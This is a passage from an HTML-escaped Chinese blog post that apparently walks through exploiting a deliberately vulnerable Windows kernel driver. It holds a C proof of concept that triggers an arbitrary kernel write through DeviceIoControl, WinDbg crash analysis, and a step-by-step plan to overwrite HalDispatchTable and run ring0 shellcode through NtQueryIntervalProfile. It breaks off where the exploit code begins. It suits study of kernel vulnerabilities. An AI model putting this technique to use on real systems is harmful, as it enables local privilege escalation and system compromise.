class=&quot;string&quot;&gt;&quot;\\\\.\\ExploitMe&quot;&lt;/span&gt;,GENERIC_READ|GENERIC_WRITE,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,OPEN_EXISTING,FILE_ATTRIBUTE_SYSTEM,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (hDevice == INVALID_HANDLE_VALUE)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       ShowErrMsg();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       return EXIT_FAILURE;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   ret = DeviceIoControl(hDevice,	&lt;span class=&quot;comment&quot;&gt;// 驱动句柄&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;number&quot;&gt;0x8888A003&lt;/span&gt;,	&lt;span class=&quot;comment&quot;&gt;// IoControlCode数值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			g_InputBuffer, 	&lt;span class=&quot;comment&quot;&gt;// 输入缓冲区指针&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, 		&lt;span class=&quot;comment&quot;&gt;// 输入缓冲区字节数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;number&quot;&gt;0x80808080&lt;/span&gt;, 	&lt;span class=&quot;comment&quot;&gt;// 输出缓冲区指针&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, 		&lt;span class=&quot;comment&quot;&gt;// 输出缓冲区字节数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&amp;amp;length, 	&lt;span class=&quot;comment&quot;&gt;// 返回实际的数据字节数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			NULL);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		 ShowErrMsg();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	   &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;DeviceIoControl Success!\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   return EXIT_SUCCESS;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;运行后系统崩溃，被windbg断下，下面是 !analyze -v 的分析结果：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;112&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;kd&amp;gt; !analyze -v&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*******************************************************************************&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*                                                                             *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*                        Bugcheck Analysis                                    *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*                                                                             *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*******************************************************************************&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PAGE_FAULT_IN_NONPAGED_AREA (50)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Invalid system memory was referenced.  This cannot be protected by try-except,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;it must be protected by a Probe.  Typically the address is just plain bad or it&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;is pointing at freed memory.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Arguments:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Arg1: 80808080, memory referenced.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Arg2: 00000001, value 0 = read operation, 1 = write operation.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Arg3: f9032546, If non-zero, the instruction address which referenced the bad memory&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	address.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Arg4: 00000000, (reserved)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Debugging Details:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*************************************************************************&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;***                                                                   ***&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;***                                                                   ***&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;***    Your debugger is not using the correct symbols                 ***&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;***                                                                   ***&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;***    In order for this command to work properly, your symbol path   ***&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;***    must point to .pdb files that have full type information.      ***&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;***                                                                   ***&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;***    Certain .pdb files (such as the public OS symbols) do not      ***&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;***    contain the required information.  Contact the group that      ***&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;***    provided you with these symbols if you need this command to    ***&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;***    work.                                                          ***&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;***                                                                   ***&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;***    Type referenced: kernel32!pNlsUserInfo                         ***&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;***                                                                   ***&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*************************************************************************&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;WRITE_ADDRESS:  80808080 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;FAULTING_IP: &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test+546&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032546 8901            mov     dword ptr [ecx],eax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MM_INTERNAL_CODE:  0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DEBUG_FLR_IMAGE_TIMESTAMP:  0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;FAULTING_MODULE: f9032000 test&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DEFAULT_BUCKET_ID:  CODE_CORRUPTION&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;BUGCHECK_STR:  0x50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PROCESS_NAME:  test.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;TRAP_FRAME:  f61b6b9c -- (.trap 0xfffffffff61b6b9c)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ErrCode = 00000002&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;eax=00000000 ebx=82567498 ecx=80808080 edx=0012ff70 esi=825cef38 edi=8256f150&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;eip=f9032546 esp=f61b6c10 ebp=f61b6c34 iopl=0         nv up ei pl zr na pe nc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test+0x546:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f9032546 8901            mov     dword ptr [ecx],eax  ds:0023:80808080=????????		// 这里证明了我们先前的分析是正确的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Resetting default scope&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;LAST_CONTROL_TRANSFER:  from 8053377f to 804e45a2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;STACK_TEXT:  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f61b66ec 8053377f 00000003 80808080 00000000 nt!RtlpBreakWithStatusInstruction&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f61b6738 80534256 00000003 806f103c c0202020 nt!KiBugCheckDebugBreak+0x19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f61b6b18 80534846 00000050 80808080 00000001 nt!KeBugCheck2+0x574&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f61b6b38 805251e0 00000050 80808080 00000001 nt!KeBugCheckEx+0x1b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f61b6b84 804e272b 00000001 80808080 00000000 nt!MmAccessFault+0x6f5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f61b6b84 f9032546 00000001 80808080 00000000 nt!KiTrap0E+0xcc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;WARNING: Stack unwind information not available. Following frames may be wrong.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f61b6c34 804e4807 825a29d0 82567498 806f1070 test+0x546				// 这里就是漏洞函数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f61b6c44 80569191 82567508 8256f150 82567498 nt!IopfCallDriver+0x31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f61b6c58 805780ca 825a29d0 82567498 8256f150 nt!IopSynchronousServiceTail+0x70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f61b6d00 8057a5e3 000007e8 00000000 00000000 nt!IopXxxControlFile+0x611&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f61b6d34 804df7ec 000007e8 00000000 00000000 nt!NtDeviceIoControlFile+0x2a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;f61b6d34 7c92e526 000007e8 00000000 00000000 nt!KiFastCallEntry+0xf8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0012fe94 7c92d28a 7c801675 000007e8 00000000 ntdll!KiIntSystemCall+0x6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0012fe98 7c801675 000007e8 00000000 00000000 ntdll!ZwDeviceIoControlFile+0xc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0012fef8 0040116c 000007e8 8888a003 0012ff70 kernel32!DeviceIoControl+0xdd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0012ff80 00401399 00000001 00380f60 00380ff8 test_400000+0x116c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0012ffc0 7c817077 00241fe4 0012f7bc 7ffdc000 test_400000+0x1399&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0012fff0 00000000 004012b0 00000000 78746341 kernel32!BaseProcessStart+0x23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;STACK_COMMAND:  kb&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;CHKIMG_EXTENSION: !chkimg -lo 50 -d !nt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    804d9f94-804d9f98  5 bytes - nt!KiXMMIZeroPage+30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	[ fa f7 80 0c 02:e9 cf 7c 7b 77 ]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;……省略部分内容……&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;WARNING: !chkimg output was truncated to 50 lines. Invoke !chkimg without &amp;apos;-lo [num_lines]&amp;apos; to view  entire output.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;231 errors : !nt (804d9f94-805363e8)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MODULE_NAME: memory_corruption&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;IMAGE_NAME:  memory_corruption&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;FOLLOWUP_NAME:  memory_corruption&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MEMORY_CORRUPTOR:  LARGE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;FAILURE_BUCKET_ID:  MEMORY_CORRUPTION_LARGE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;BUCKET_ID:  MEMORY_CORRUPTION_LARGE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Followup: memory_corruption&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;---------&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;0x02-漏洞利用&quot;&gt;&lt;a href=&quot;#0x02-漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;0x02 漏洞利用&quot;&gt;&lt;/a&gt;0x02 漏洞利用&lt;/h3&gt;&lt;p&gt;利用思路：1、获取HalDispatchTable表地址，再偏移0x4找到HalQuerySystemInformation函数地址；&lt;br&gt;          2、利用内核漏洞将HalQuerySystemInformation函数地址修改为0x0；&lt;br&gt;          3、在0x0地址处申请块内存，然后将ring0 shellcode拷贝过去；&lt;br&gt;          4、通过调用NtQueryIntervalProfile函数来执行0x0处的shellcode。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span 